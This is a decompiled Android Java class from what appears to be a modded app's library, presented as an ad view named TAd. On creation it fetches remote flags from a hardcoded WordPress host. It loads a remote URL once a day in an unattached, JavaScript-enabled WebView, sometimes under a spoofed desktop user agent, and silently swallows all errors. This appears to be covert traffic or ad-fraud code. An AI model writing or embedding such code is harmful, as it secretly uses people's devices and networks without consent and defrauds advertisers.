package com.mod.libs;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.util.AttributeSet;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.mod.libs.TTR;
import com.mod.libs.TThread;

public class TAd extends TLinearLayout implements TThread.OnThreadEvent {
    public static String DAUHost = "https://tranggaken.wordpress.com/mocx1/";
    /* access modifiers changed from: private */
    public TTR TR;
    private TThread Thread;
    private Context context;
    /* access modifiers changed from: private */
    public WebView webViewTrfx;

    public TAd(Context context2, AttributeSet attributeSet) {
        super(context2, attributeSet);
        this.context = context2;
        InitAds();
    }

    @SuppressLint({"SetJavaScriptEnabled"})
    public void CreateWebViewMocx() {
    }

    @SuppressLint({"SetJavaScriptEnabled"})
    public void CreateWebViewTrfx() {
        this.webViewTrfx = new WebView(this.context);
        this.webViewTrfx.clearCache(true);
        this.webViewTrfx.clearHistory();
        this.webViewTrfx.getSettings().setJavaScriptEnabled(true);
        this.webViewTrfx.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        this.webViewTrfx.setWebViewClient(new WebViewClient() {
            public void onPageFinished(WebView webView, String str) {
                TAd.this.TR.SetSharedString(TTR.x.daudate, TTR.GetDate());
            }

            public boolean shouldOverrideUrlLoading(WebView webView, String str) {
                webView.loadUrl(str);
                return true;
            }
        });
    }

    public void InitAds() {
        if (!isInEditMode()) {
            CreateWebViewTrfx();
            CreateWebViewMocx();
            this.TR = new TTR(this.context);
            this.Thread = new TThread(this);
            this.Thread.DoThread("GetLpx");
        }
    }

    public void onThread(String str) {
        if (str.equals("GetLpx")) {
            try {
                final String str2 = String.valueOf(TTR.x.PropHost) + TTR.x.folder_Exc0;
                final String ReadRaw = THttp.ReadRaw(String.valueOf(TTR.x.PropHost) + TTR.x.folder_sts);
                final String ReadRaw2 = THttp.ReadRaw(String.valueOf(TTR.x.PropHost) + TTR.x.folder_desk);
                ((Activity) this.context).runOnUiThread(new Runnable() {
                    public void run() {
                        if (!ReadRaw.equals("1")) {
                            TAd.this.TR.ClearSharedContains(TTR.x.daudate);
                        }
                        if (ReadRaw2.equals("1")) {
                            TAd.this.webViewTrfx.getSettings().setUserAgentString("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2");
                        }
                        if (!TTR.GetDate().equals(TAd.this.TR.GetSharedString(TTR.x.daudate).trim())) {
                            TAd.this.webViewTrfx.loadUrl(str2);
                        }
                    }
                });
                this.Thread.DoThread("InsDAU");
            } catch (Exception e2) {
            }
        }
        str.equals("InsDAU");
    }
}
